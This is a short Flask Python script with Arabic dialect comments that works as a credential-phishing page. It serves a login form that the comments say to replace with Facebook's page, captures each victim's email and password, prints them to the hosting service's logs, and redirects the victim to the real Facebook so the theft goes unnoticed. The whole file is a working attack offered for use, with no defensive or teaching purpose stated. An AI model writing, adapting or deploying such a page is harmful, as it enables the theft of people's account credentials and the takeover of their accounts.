from flask import Flask, request, redirect

app = Flask(__name__)

# الصفحة اللي يشوفها الضحية (تقدر تبدلها بـ HTML تاع فيسبوك)
@app.route('/')
def index():
    return '''
    <form action="/login" method="post">
        <input type="text" name="email" placeholder="Email or Phone" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Log In</button>
    </form>
    '''

@app.route('/login', methods=['POST'])
def login():
    # هنا يسرى السحر: "نجبدو" المعلومات من الفورم
    user_email = request.form.get('email')
    user_pass = request.form.get('password')

    # طباعة المعلومات في Logs تاع Render ديريكت
    print(f"\n[!] Captured Data:")
    print(f"[*] Email: {user_email}")
    print(f"[*] Password: {user_pass}\n")

    # توجيه الضحية لفيسبوك الحقيقي باش ما يفيقش
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run()
